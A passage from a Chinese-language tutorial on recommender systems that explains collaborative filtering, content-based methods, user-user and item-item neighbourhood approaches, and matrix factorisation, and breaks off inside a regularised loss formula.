filtering methods paradigm."></p><p>协同过滤的主要优点是，它们不需要用户或物品的相关信息，只需要用户与物品之间发生的互动关系，因此可以在许多情况下使用。此外，用户与商品的互动越多，新的推荐就越准确：对于固定的用户和商品集，随着时间的推移，新的互动记录会带来新的信息，使系统越来越有效。</p><p>然而，协同过滤只考虑过去的交互记录进行推荐。上述优点存在的同时也会带来“冷启动问题”：算法不可能向新用户推荐任何东西，也不可能向任何用户推荐一个新物品，许多用户或物品的交互太少，无法有效处理。这一缺陷可以通过不同的方式解决：向新用户推荐随机物品或向随机用户推荐新物品（随机策略），向新用户推荐热门物品或向最活跃用户推荐新物品（最大期望策略），向新用户推荐一组不同的物品或向一组不同的用户推荐新物品（探索策略），最后，对用户或物品的早期使用非协同过滤的方法。</p><h3 id="基于内容的方法">基于内容的方法</h3><p>与仅依赖用户-物品交互的协同过滤方法不同，基于内容的方法使用与用户和/或物品有关的额外信息。面对一个推荐电影的算法系统，那么这些额外的信息可以是，用户的年龄、性别、工作或任何其他个人信息，以及类别、主要演员、时长或电影的其他特征。</p><p>然后，基于内容的方法的核心思想是尝试建立一个模型，基于上述可用的“特征”，解释所观察到的用户——物品交互关系。仍沿用上例，我们将尝试模拟这样一个事实，年轻女性倾向于给一些电影评分更高，年轻男性倾向于给另一些电影评分更高，等等。如果我们设法得到这样的模型，那么，对用户进行新的预测是非常容易的:我们只需要查看该用户的个人资料(年龄、性别等)，并根据这些信息确定要推荐的相关电影。</p><p><img src="https://miro.medium.com/max/1400/1*ReuY4yOoqKMatHNJupcM5A@2x.webp" alt="Overview of the content based methods paradigm."></p><p>与协同过滤相比，基于内容的方法较少受到冷启动问题的困扰：新用户或物品可以通过其特征（内容）进行描述，因此可以为这些新实体提供相关建议。只有新用户或具有之前未见功能的道具才会受到这种缺陷的影响，但一旦系统足够老，这种情况几乎不会发生。</p><h3 id="模型，偏差与方差">模型，偏差与方差</h3><p>让我们更多地关注一下前面提到的方法之间的主要区别。特别地，让我们看看建模水平对偏差和方差的影响。</p><p>在基于内存的协同过滤方法中，不存在潜在模型。算法直接作用与用户-物品交互记录：例如，用户由他们与物品的交互作用表示，并使用对这些表示的最近邻居搜索来产生建议。由于没有假定潜在模型，这些方法理论上具有低偏差但高方差。</p><p>在基于模型的协同过滤中，存在一些潜在的交互模型。该模型经过训练，可以从它自己的用户和物品表示中重建用户——物品交互值。然后根据这个模型提出新的建议。由模型提取的用户和物品潜在特征联系，具有难以为人类解释的数学意义。由于假设了用户——物品交互的（相当自由的）模型，该方法理论上比假设没有潜在模型的方法有更高的偏差，但方差更低。</p><p>最后，在基于内容的方法中，也存在一些潜在的交互模型。然而，这里的模型提供了定义用户和/或物品表示的内容：例如，用户由给定的特征表示，我们尝试为每个物品建模喜欢或不喜欢该物品的用户配置文件类型。对于基于模型的协作方法，本文假设了一个用户-物品交互模型。然而，该模型受到更多约束(因为给出了用户和/或物品的表示)，因此，该方法倾向于具有最大的偏差但方差最小。</p><h2 id="基于内存的协同过滤方法">基于内存的协同过滤方法</h2><p>用户——用户和物品——物品方法的主要特征是，他们只使用来自用户——物品交互矩阵的信息，并且他们假设没有模型来产生新的推荐。</p><h3 id="用户——用户">用户——用户</h3><p>为了给用户做出新的推荐，用户——用户方法粗略地去识别具有<strong>最相似的“交互信息”（最近的邻居）的用户</strong>，以便将这些邻居中最受欢迎的物品（并且对该用户来说是“新”的）推荐给他。这种方法被称为“以用户为中心”，因为它基于用户与物品的交互来表示用户，并评估用户之间的距离。</p><p>假设我们要为某位用户进行推荐。首先，用户的交互记录数据组成的向量就可以表示该用户（交互矩阵中的“一行”）。然后，我们可以计算该用户和所有其他用户之间的某种“相似性”。相似度衡量是这样的，在相同的物品上有相似交互数据的两个用户，就应该被认为是相似的。一旦计算出每个用户的相似度，我们就可以保留该用户的 K 个最邻近邻居，然后将其中最受欢迎的商品推荐给他（当然不包含该用户已经与之交互的物品）。</p><p>请注意，在计算用户之间的相似度时，应该仔细考虑“共同交互”的数量（两个用户已经考虑了多少项?）实际上，大多数时候，我们希望避免以下情况：该用户与只有一次共同交互的人有100%的匹配，比其与有100次共同交互的用户但“只有”98%匹配的人“更接近”。所以，我们认为两个用户是相似的，如果他们以相同的方式与许多共同的物品进行交互(相似的评级，相似的悬停时间……)。</p><p><img src="https://miro.medium.com/max/720/1*nmoJhj4LgqrbhFV1V4-ErA@2x.webp" alt="Illustration of the user-user method. The same colour code will be used in the remaining of the post."></p><h3 id="物品——物品">物品——物品</h3><p>要向用户推荐新的物品，物品——物品的思想是寻找与用户已经“积极”交互过的物品的相似物。如果大多数用户以类似的方式与两个物品进行交互，则认为两个物品是相似的。这种方法被称为“以物品为中心”，因为它基于用户与物品的交互来表示物品，并评估这些物品之间的距离。</p><p>假设我们要为给定的用户提供推荐。首先，我们考虑这个用户最喜欢的物品，用该物品与每个用户的交互向量（即它的列）表示它。然后，我们可以计算“最佳物品”和所有其他商品之间的相似度。一旦计算出相似度，我们就可以保留与所选“最佳商品”的k个最近邻居，这些物品对我们感兴趣的用户是新的，并推荐这些物品。</p><p>请注意，为了获得更多相关的推荐，我们可以对用户喜欢的其他物品进行做类似的工作，即考虑n个最喜欢的物品。在这种情况下，我们可以推荐与这些首选物品中的几个接近的物品。</p><p><img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*Q3HCUZtlQP05Vp2U-19P6w@2x.png" alt="Illustration of the item-item method."></p><h3 id="比较用户——用户和物品——物品">比较用户——用户和物品——物品</h3><p>用户——用户方法是搜索与物品交互的相似用户。而一般来说，每个用户只与几个物品进行交互，这使得该方法对任何记录的交互都非常敏感（高方差）。另一方面，由于最终的推荐仅基于与我们感兴趣的用户相似的用户的交互记录，因此我们获得了更个性化的结果（低偏差）。</p><p>相反，物品——物品方法是搜索用户——物品交互方面的相似物品。一般来说，很多用户都与某件物品进行了交互，因此邻域搜索对单个交互的敏感度要低得多（方差更低）。对应地，来自各种用户的交互信息会被推荐系统考虑，因此方法不那么个性化（更有偏差）。但是，这种方法更加健壮。</p><p><img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*J7bZ-K-6RwmwlYUqoXFOOQ@2x.png" alt="Illustration of the difference between item-item and user-user methods."></p><h3 id="复杂性和副作用">复杂性和副作用</h3><p>基于内存的协同过滤的最大缺陷之一是它们不容易扩展：对于大系统来说，生成一个新的推荐可能非常耗时。事实上，对于拥有数百万用户和数百万物品的系统，如果不仔细设计，最近邻搜索步骤可能会变得难以处理。KNN算法的复杂度为O(ndk)，其中n为用户数量，d为项数量，k为考虑的邻居数量。为了使大型系统的计算更易于处理，我们可以在设计算法时利用交互矩阵的稀疏性，或者使用近似最近邻方法(ANN)。</p><p>在大多数推荐算法中，有必要极其小心地避免受欢迎商品的“马太效应”，以避免让用户陷入所谓的“信息茧房”。换句话说，我们不希望我们的系统倾向于只推荐越来越多的流行商品，我们也不希望我们的用户只收到与他们已经喜欢的商品非常接近的商品的推荐，而没有机会了解他们可能也喜欢的新商品，因为这些商品“不够接近”而不能被推荐。如果像我们提到的，这些问题会出现在大多数推荐算法中，那么对于基于内存的协作推荐算法来说尤其如此。的确，由于缺乏规范的模式，这种现象会更加突出和频繁地被观察到。</p><h2 id="基于模型的协同过滤算法">基于模型的协同过滤算法</h2><p>基于模型的协作过滤算法只依赖于用户——物品交互信息，并使用一个潜在的模型来解释这些交互。例如，矩阵分解（Matrix Factorisation）将庞大而稀疏的用户——物品交互矩阵分解为两个较小而密集的矩阵的乘积：一个用户——因素矩阵（包含用户表示）乘以一个因素——物品矩阵（包含物品表示）。</p><h3 id="矩阵分解">矩阵分解</h3><p>矩阵分解算法主要的假设是，存在一个相当低维的潜在特征空间，使得可以在其中表示用户和物品的特征。于是，用户和物品之间的交互信息可以通过计算该空间中相应密集向量的点积来获得。</p><p>例如，假设我们有一个用户——电影评级矩阵。为了模拟用户和电影之间的交互，我们可以假设:</p><ul><li>有一些特征可以很好地描述（和区分）电影</li><li>有一些特征也可以用来描述用户偏好</li></ul><p>然而，我们不太可能为该模型显式地提供这些特征（稍后介绍的基于内容的方法是这样做）。相反，让系统自己发现这些有用的特征，并对用户和物品做出自己的表示才是我们想要的。由于这些特征是学习得到的，而不是开发者给定的，单独提取的特征具有特殊的数学意义，但没有直观的解释（因此人类很难理解）。然而，从这种算法中产生的结构非常接近人类可以想到的直观分解。事实上，这种分解的结果是，在偏好方面接近的用户，以及在特征方面接近的物品，最终在潜在空间中具有相近的特征。</p><p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*E9EE5LXxty1EB8fn_s1jkQ@2x.png" alt="Illustration of the matrix factorization method."></p><h3 id="矩阵分解的数学表示">矩阵分解的数学表示</h3><p>在这一小节中，我们将给出矩阵分解的简单数学表示。更特别的是，我们描述了一种基于梯度下降的经典迭代方法，它可以在不将所有数据同时加载到计算机内存的情况下获得非常大的矩阵的因式分解。</p><p>给定一个交互矩阵 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mo stretchy="false">(</mo><mi>n</mi><mo>×</mo><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">M (n\times m)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span></span>，一共有n个用户和m个物品。其中每个用户只对一些物品进行了评分（因此大多数项被设置为None 以表示缺乏此项评分）。而我们要因式分解该矩阵：</p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>M</mi><mo>≈</mo><mi>X</mi><msup><mi>Y</mi><mi>T</mi></msup></mrow><annotation encoding="application/x-tex">M \approx XY^T </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8913em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span></span></span></span></span></p><p>其中，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo stretchy="false">(</mo><mi>n</mi><mo>×</mo><mi>l</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">X (n \times l)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mclose">)</span></span></span></span> 是用户矩阵，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Y</mi><mo stretchy="false">(</mo><mi>m</mi><mo>×</mo><mi>l</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Y (m\times l)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mclose">)</span></span></span></span>是物品矩阵，并定义物品向量和用户向量：</p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>u</mi><mi>s</mi><mi>e</mi><msub><mi>r</mi><mi>i</mi></msub><mo>≡</mo><msub><mi>X</mi><mi>i</mi></msub><mtext>  </mtext><mi mathvariant="normal">∀</mi><mi>i</mi><mo>∈</mo><mo stretchy="false">{</mo><mn>1</mn><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">user_i \equiv X_i \space\space \forall i \in \{1,...,n\} </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6138em;vertical-align:-0.15em;"></span><span class="mord mathnormal">u</span><span class="mord mathnormal">se</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace"> </span><span class="mspace"> </span><span class="mord">∀</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">...</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mclose">}</span></span></span></span></span></p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>i</mi><mi>t</mi><mi>e</mi><msub><mi>m</mi><mi>j</mi></msub><mo>≡</mo><msub><mi>Y</mi><mi>j</mi></msub><mtext>  </mtext><mi mathvariant="normal">∀</mi><mi>j</mi><mo>∈</mo><mo stretchy="false">{</mo><mn>1</mn><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mi>m</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">item_j \equiv Y_j \space\space \forall j \in \{1,...,m\} </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9456em;vertical-align:-0.2861em;"></span><span class="mord mathnormal">i</span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9805em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace"> </span><span class="mspace"> </span><span class="mord">∀</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">...</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span><span class="mclose">}</span></span></span></span></span></p><p>这里l是表示用户和物品的潜在空间的维度。因此，我们搜索矩阵<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Y</mi></mrow><annotation encoding="application/x-tex">Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span>，让它们的点积最接近现有的交互信息。我们使用<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi></mrow><annotation encoding="application/x-tex">E</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span></span></span></span>表示对用户i和物品j的二元组<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(i,j)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">)</span></span></span></span>的非空集合，用<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>M</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub></mrow><annotation encoding="application/x-tex">M_{ij}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">ij</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>表示该评分，显然，我们想要能将真实的评分与矩阵分解模型计算的评分误差尽可能减到最小的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Y</mi></mrow><annotation encoding="application/x-tex">Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span>。用数学表示即为：</p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">,</mo><mi>Y</mi><mo stretchy="false">)</mo><mo>=</mo><munder><mo><mi>arg</mi><mo>⁡</mo><mi>min</mi><mo>⁡</mo></mo><mrow><mi>X</mi><mo separator="true">,</mo><mi>Y</mi></mrow></munder><munder><mo>∑</mo><mrow><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo><mo>∈</mo><mi>E</mi></mrow></munder><mrow><mo stretchy="false">[</mo><mo stretchy="false">(</mo><msub><mi>X</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo stretchy="false">(</mo><msub><mi>Y</mi><mi>j</mi></msub><msup><mo stretchy="false">)</mo><mi>T</mi></msup><mo>−</mo><msub><mi>M</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi></mrow></msub><msup><mo stretchy="false">]</mo><mn>2</mn></msup></mrow></mrow><annotation encoding="application/x-tex">(X, Y) = \mathop{\arg\min}\limits_{X, Y} \sum_{(i,j)\in E}{[(X_i)(Y_j)^T-M_{i,j}]^2} </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.566em;vertical-align:-1.516em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6679em;"><span style="top:-2.1612em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07847em;">X</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">Y</span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop"><span class="mop">ar<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop">min</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.0749em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.05em;"><span style="top:-1.809em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mclose mtight">)</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.05764em;">E</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.516em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mopen">[(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span></span></p><p>为防止过拟合和欠拟合问题，再加上一个<a href="https://www.simplilearn.com/tutorials/machine-learning-tutorial/regularization-in-machine-learning">正则化因子</a>，再除以2，得到</p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">,</mo><mi>Y</mi><mo stretchy="false">)</mo><mo>=</mo><munder><mo><mi>arg</mi><mo>⁡</mo><mi>min</mi><mo>⁡</mo></mo><mrow><mi>X</mi><mo separator="true">,</mo><mi>Y</mi></mrow></munder><mfrac><mn>1</mn><mn>2</mn></mfrac><munder><mo>∑</mo><mrow><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo><mo>∈</mo><mi>E</mi></mrow></munder><mrow><mo stretchy="false">[</mo><mo stretchy="false">(</mo><msub><mi>X</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo stretchy="false">(</mo><msub><mi>Y</mi><mi>j</mi></msub><msup><mo stretchy="false">)</mo><mi>T</mi></msup><mo>−</mo><msub><mi>M</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi></mrow></msub><msup><mo stretchy="false">]</mo><mn>2</mn></msup></mrow><mo>+</mo><mfrac><mi>λ</mi><mn>2</mn></mfrac><mo stretchy="false">(</mo><munder><mo>∑</mo><mrow><mi>i</mi><mo separator="true">,</mo><mi>k</mi></mrow></munder><mo stretchy="false">(</mo><msub><mi>X</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>k</mi></mrow></msub><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo>+</mo><munder><mo>∑</mo><mrow><mi>j</mi><mo separator="true">,</mo><mi>k</mi></mrow></munder><mo stretchy="false">(</mo><msub><mi>Y</mi><mrow><mi>j</mi><mo separator="true">,</mo><mi>k</mi></mrow></msub><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(X, Y) = \mathop{\arg\min}\limits_{X, Y} \frac{1}{2}\sum_{(i,j)\in E}{[(X_i)(Y_j)^T-M_{i,j}]^2} + 